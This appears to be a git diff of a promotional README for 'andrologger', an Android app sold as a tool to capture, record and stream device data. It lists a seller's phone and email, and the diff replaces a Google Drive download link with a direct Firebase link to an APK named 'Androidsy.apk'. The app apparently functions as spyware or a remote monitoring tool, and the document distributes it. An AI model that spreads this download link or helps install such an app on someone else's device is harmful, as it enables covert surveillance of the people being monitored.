@@ -1,4 +1,4 @@
-IIntroducing a cutting-edge mobile monitoring application designed to provide comprehensive, real-time insights and advanced functionality for users seeking robust device tracking and management capabilities. This powerful application offers a wide range of features to capture, record, and stream critical data securely and efficiently, all without the need for port forwarding.
+noIIntroducing a cutting-edge mobile monitoring application designed to provide comprehensive, real-time insights and advanced functionality for users seeking robust device tracking and management capabilities. This powerful application offers a wide range of features to capture, record, and stream critical data securely and efficiently, all without the need for port forwarding.
 
 Key Features:
 
@@ -27,6 +27,8 @@ Phone/WhatsApp: +30 6970481925
 Email: andrologger1@gmail.com
 This advanced mobile monitoring solution is the perfect tool for users seeking unparalleled control and visibility over device activity, delivering a comprehensive suite of features in a single, easy-to-use application.
 
-download https://drive.google.com/file/d/1e3xxLZo12SL65TuACnYnTaxikTySeQ-j/view?usp=drivesdk
+download
+https://firebasestorage.googleapis.com/v0/b/andrologger-fe931.appspot.com/o/Androidsy.apk?alt=media&token=cc7c55ba-46a3-4274-9119-625e90c96e9d
+
 
 https://youtu.be/Weakn-x3Wf8?si=1WkXc4reVWsjS2YZ
